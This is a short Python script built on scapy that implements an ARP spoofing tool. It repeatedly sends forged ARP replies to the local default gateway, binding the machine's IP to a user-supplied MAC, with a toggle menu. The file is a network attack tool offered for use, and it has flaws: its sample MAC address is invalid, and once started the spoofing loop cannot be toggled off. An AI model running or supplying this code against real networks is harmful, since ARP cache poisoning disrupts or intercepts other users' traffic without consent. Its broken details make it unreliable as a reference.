import time
from scapy.all import ARP, send
import colorama
from colorama import Fore, Style
import socket
import netifaces

colorama.init()

class ArpSpoofer:
    def __init__(self):
        self.spoofing = False
        self.ip_address = self.get_ip_address()
        self.gateway_ip = self.get_gateway_ip()
        self.new_mac = self.get_mac_address()

    def get_mac_address(self):
        mac_address = input("enter your changed mac address (e.g., DEGB4GC54YE): ")
        formatted_mac_address = ":".join(mac_address[i:i+2] for i in range(0, len(mac_address), 2))
        return formatted_mac_address

    def get_ip_address(self):
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address

    def get_gateway_ip(self):
        gws = netifaces.gateways()
        return gws['default'][netifaces.AF_INET][0]

    def arp_spoof(self):
        print("ARP Spoofing started...")
        arp_response = ARP(pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.ip_address, hwsrc=self.new_mac)
        while self.spoofing:
            send(arp_response, verbose=0)
            print(f"Sent ARP packet: {arp_response.summary()}")
            time.sleep(1)

    def display_spoofing_status(self):
        status_color = Fore.GREEN if self.spoofing else Fore.RED
        print(f"Spoofing: {status_color}{'On' if self.spoofing else 'Off'}{Style.RESET_ALL}")

    def switch_status(self):
        self.spoofing = not self.spoofing
        self.display_spoofing_status()
        if self.spoofing:
            self.arp_spoof()

def main():
    spoofer = ArpSpoofer()
    spoofer.display_spoofing_status()

    while True:
        user_input = input("Press 1 to switch status: ")
        if user_input == '1':
            spoofer.switch_status()

if __name__ == "__main__":
    main()